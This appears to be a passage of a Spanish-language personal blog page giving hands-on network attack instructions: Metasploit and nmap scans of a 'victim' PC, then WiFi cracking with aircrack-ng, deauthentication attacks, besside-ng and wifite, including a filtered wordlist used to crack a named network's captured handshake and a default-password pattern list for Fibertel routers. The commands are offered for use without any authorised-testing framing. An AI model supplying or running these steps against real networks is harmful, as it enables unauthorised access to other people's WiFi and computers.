<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfconsole
</span></span><span style="display:flex;"><span>use auxiliary/scanner/portscan/syn
</span></span><span style="display:flex;"><span>set RHOSTS 192.168.100.28
</span></span><span style="display:flex;"><span>set threads <span style="color:#ae81ff">50</span>
</span></span><span style="display:flex;"><span>show options 
</span></span><span style="display:flex;"><span>set PORTS <span style="color:#ae81ff">445</span> <span style="color:#75715e"># opcional</span>
</span></span><span style="display:flex;"><span>set PORTS 1-65535 <span style="color:#75715e"># opcional</span>
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p>Si el puerto 445 está abierto haremos lo siguiente.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use scanner/smb/smb_version
</span></span><span style="display:flex;"><span>set RHOSTS 192.168.100.28
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p>Y nos dirá que versión de <strong>Windows</strong> es</p>
<p>O usamos portscan tcp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfconsole
</span></span><span style="display:flex;"><span>use auxiliary/scanner/portscan/tcp
</span></span><span style="display:flex;"><span>set RHOSTS 192.168.100.28 <span style="color:#75715e"># pc victima</span>
</span></span><span style="display:flex;"><span>set threads <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>show options 
</span></span><span style="display:flex;"><span>set PORTS 1-65535 <span style="color:#75715e"># opcional</span>
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><h3 id="como-usar-metasploit-para-escanear-vulnerabilidades">Como usar metasploit para escanear vulnerabilidades.</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>service postgreqsql start 
</span></span><span style="display:flex;"><span>msfdb init
</span></span><span style="display:flex;"><span>msfconsole
</span></span><span style="display:flex;"><span>db_nmap -v -sV 192.168.0.120
</span></span><span style="display:flex;"><span>db_nmap -sS -Pn -A 192.168.0.120
</span></span><span style="display:flex;"><span>use scanner/ssh/ssh_version 
</span></span><span style="display:flex;"><span>set RHOSTS 192.168.0.120 
</span></span><span style="display:flex;"><span>set THREADS 50 
</span></span><span style="display:flex;"><span>run
</span></span><span style="display:flex;"><span>search name:httpd
</span></span></code></pre></div><h3 id="nmap-escanear-por-vulnerabilidades">NMAP Escanear por vulnerabilidades.</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn --script vuln &lt;&lt;Target_computer_ip_address&gt;&gt;
</span></span></code></pre></div><h3 id="buscamos-vulnerabilidades-con-metasploit">Buscamos vulnerabilidades con metasploit</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>search vuln
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Seleccioná tu vulnerabilidad</span>
</span></span><span style="display:flex;"><span>use auxiliary/scanner/...
</span></span></code></pre></div><h2 id="algunos-otros-escáneres-de-vulnerabilidades-comunes-en-metasploit-son">Algunos otros escáneres de vulnerabilidades comunes en Metasploit son:</h2>
<ol>
<li>Escáneres SMB: busque MS17-010, CVE-2020-0796, etc.
<code>use auxiliary/scanner/smb/smb_ms17_010</code></li>
<li>Escáneres FTP: compruebe si hay vulnerabilidades FTP como la puerta trasera vsftpd. <code>use auxiliary/scanner/ftp/ftp_version</code></li>
<li>Escáneres SMTP: pruebas de autenticación EXIM, problemas de TLS, etc.
<code>use auxiliary/scanner/smtp/smtp_enum</code></li>
<li>Escáneres SSH: detectan algoritmos de cifrado débiles.
<code>use auxiliary/scanner/ssh/ssh_cipher_enum</code></li>
<li>Escáneres de bases de datos: inyección de SQL, credenciales débiles, etc.
<code>use auxiliary/scanner/mssql/mssql_ping</code></li>
</ol>
<p>Acá dejo un tuto:
<a href="https://archive.is/MLuUs">Samba Server Exploitation Using NMAP and Metasploit</a></p>
<h3 id="vulnerá-windows-con-metasploit">Vulnerá Windows con Metasploit</h3>
<p><a href="https://youtube.com/watch?v=y4-oIl6bkbE">https://youtube.com/watch?v=y4-oIl6bkbE</a><br>
<a href="https://youtube.com/watch?v=4PGjyKhYzdY">https://youtube.com/watch?v=4PGjyKhYzdY</a></p>
<h3 id="playlist-sobre-metasploit">Playlist sobre metasploit.</h3>
<p>Y acá una guía de metasploit:
<a href="https://youtube.com/playlist?list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm">https://youtube.com/playlist?list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm</a></p>
<p>Google y YouTube borraron miles de videos de hacking así que pueden buscar tutoriales sobre metasploit también por torrent usando qBittorrent y jackket.</p>
<p>Si capturaron el handshake y tienen una computadora muy lenta lo pueden subir a arg-wireless y le correrán un diccionario.</p>
<h3 id="ejemplos">Ejemplos</h3>
<p>Salio la clave. Antes por ataque de WPS pude descubrir que uso una palabra y 4 numeros. Entonces baje el diccionario de latin en weakpass y filtre las palabras que contengan EXACTAMENTE 4 numeros al final con <code>grep</code>, si alguno sabe una mejor forma de hacer esto diganme. De un diccionario de 11 gigas pase a uno de 1,7 gigas. En 3 dias salio clave solo con CPU (<code>Intel Celeron 2.0GHz</code>)</p>
<pre tabindex="0"><code>grep -E &#39;\b([^0-9]*[0-9]){4}$[^0-9]*\b&#39; weakpass_4.latin.txt &gt; sanchez_dicc1
grep -E &#39;^[^0-9]*([0-9]){4}$&#39; sanchez_dicc1 &gt; sanchez_dicc2
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aircrack-ng -w sanchez_dicc2 /home/esotericwarfare/Sanchez1/handshake-FE:A0:3F:21:00:91.cap
</span></span></code></pre></div><h4 id="observación">Observación</h4>
<p>Supongamos que corremos el diccionario de 46 gigabytes o hacemos un ataque de gemelo malvado o hacemos un ataque de WPS o hacemos un ataque de WEP (obsoleto) y encontramos que la contraseña es: sakura2629</p>
<p>Ahora ya conocemos el patrón de la contraseña.</p>
<p>Entonces tomamos un diccionario de 46 gigas y aplicamos los siguientes filtros:</p>
<ol>
<li>
<p>Cómo mínimo la contraseña tiene que ser 8 caracteres.</p>
</li>
<li>
<p>Solo nos quedamos con las palabras que tengan exactamente 4 números AL FINAL.</p>
</li>
<li>
<p>Creamos 3 diccionarios:</p>
</li>
</ol>
<ul>
<li>Solo nos quedamos con las palabras que contengan sakura: menos de 1 megabyte.</li>
<li>Solo nos quedamos con las palabras que contengan 26: aprox. 500 megabytes que lo podés probar en 3 horas.</li>
<li>Solo nos quedamos con las palabras que contengan 29: aprox. 500 megabytes que lo podés probar en 3 horas.</li>
</ul>
<p>Es decir de un diccionario de 46 gigabytes nos quedamos con 3 diccionarios que lo podemos probar en menos de 1 día.</p>
<h4 id="fibertel-wifi-xxx">Fibertel WiFi xxx</h4>
<p><a href="https://imlauera.github.io/crackear_fibertel/">https://imlauera.github.io/crackear_fibertel/</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>004+DNI
</span></span><span style="display:flex;"><span>004+DNI+abc
</span></span><span style="display:flex;"><span>004+DNI+w1f1
</span></span><span style="display:flex;"><span>004+DNI+xxx
</span></span><span style="display:flex;"><span>003+DNI+xxx
</span></span><span style="display:flex;"><span>001+DNI+xxx
</span></span><span style="display:flex;"><span>002+DNI+xxx
</span></span><span style="display:flex;"><span>014+DNI+xxx
</span></span><span style="display:flex;"><span>420+DNI+xxx
</span></span><span style="display:flex;"><span>412+DNI+xxx
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><h4 id="besside-ng-solo-sirve-para-wpa">Besside-ng (solo sirve para WPA)</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>airmon-ng check kill
</span></span><span style="display:flex;"><span>airmon-ng start wlp1s0
</span></span><span style="display:flex;"><span>airodump-ng wlp1s0
</span></span><span style="display:flex;"><span>besside-ng -b BBSID
</span></span></code></pre></div><h4 id="more-hacking">More hacking</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sudo su
</span></span><span style="display:flex;"><span>airmon-ng check kill
</span></span><span style="display:flex;"><span>airmon-ng start wlp1s0
</span></span><span style="display:flex;"><span>airodump-ng wlp1s0
</span></span><span style="display:flex;"><span>sudo airodump-ng -w wificapture -c NUMERO_CANAL --bssid ... wlp1s0 # wificapture para capturar el handshake
</span></span><span style="display:flex;"><span>sudo aireplay-ng -D --deauth 0 -a BSSID_NETWORK wlp1s0 # Si no pones el cliente tenes que agregar la opcion -D
</span></span><span style="display:flex;"><span>wireshark wificapture-01.cap
</span></span><span style="display:flex;"><span>sudo airmon-ng stop wlp1s0 
</span></span></code></pre></div><h3 id="wifite">wifite</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wifite
</span></span></code></pre></div><p>Saludos, que Dios los bendiga.</p>

</div>


      </div>
    </section>
  </section><script 
src="/quiz/quizdown.js">
</script>
<script 
src="/quiz/quizdownKatex.js">
</script>
<script 
src="/quiz/quizdownHighlight.js">
</script>
<script>quizdown.register(quizdownHighlight).register(quizdownKatex).init()</script> 
<footer class="footer">
  <div class="content has-text-centered">
    
    
    <p>
      
      <a class="" href="https://imlauera.github.io/index.xml" target="_blank">
        <span>
          RSS
        </span>
      </a>
      
      | <a href="https://imlauera.github.io" target="_blank">Andres Imlauer.</a> 

      
      
    </p>
    
  </div>




<script type="text/javascript"
  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
  </script>
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({ tex2jax: {inlineMath: [["$","$"],["\\(","\\)"]]} })
</script>
</footer>


</body>
</html>
